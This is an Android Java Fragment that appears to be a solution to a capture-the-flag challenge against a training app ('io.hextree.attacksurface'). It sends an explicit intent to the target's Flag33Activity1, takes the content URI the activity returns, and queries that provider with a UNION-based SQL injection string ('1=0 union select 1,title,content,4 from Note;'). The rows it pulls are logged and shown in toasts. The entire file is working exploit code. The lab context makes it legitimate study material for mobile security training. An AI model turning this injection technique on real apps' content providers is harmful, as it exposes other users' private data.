package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

public class Flag33_1Fragment extends Fragment {
    private static final String TAG = "Flag33_1Fragment";

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag33_1, container, false);
        Button launchButton = view.findViewById(R.id.btnLaunchFlag33_1);
        
        launchButton.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setAction("io.hextree.FLAG33");
            intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag33Activity1"));
            startActivityForResult(intent, 1337);
        });

        return view;
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent intent) {
        super.onActivityResult(requestCode, resultCode, intent);
        dumpFlag33Provider(intent.getData());
    }

    private void dumpFlag33Provider(Uri uri) {
        // SELECT * FROM Flag WHERE selection;
        String selection = "1=0 union select 1,title,content,4 from Note;";
        Cursor cursor = requireContext().getContentResolver().query(uri, null, selection,
                null, null);

        if (cursor != null) {
            if (cursor.moveToFirst()) {
                do {
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < cursor.getColumnCount(); i++) {
                        if (sb.length() > 0) sb.append(", ");
                        sb.append(cursor.getColumnName(i)).append(" = ").append(cursor.getString(i));
                    }
                    Log.d(TAG, sb.toString());
                    Toast.makeText(getContext(), sb.toString(), Toast.LENGTH_LONG).show();
                } while (cursor.moveToNext());
            } else {
                Log.d(TAG, "Cursor is empty.");
                Toast.makeText(getContext(), "No data found", Toast.LENGTH_SHORT).show();
            }
            cursor.close();
        } else {
            Log.d(TAG, "Query failed or returned null cursor.");
            Toast.makeText(getContext(), "Query failed", Toast.LENGTH_SHORT).show();
        }
    }
} 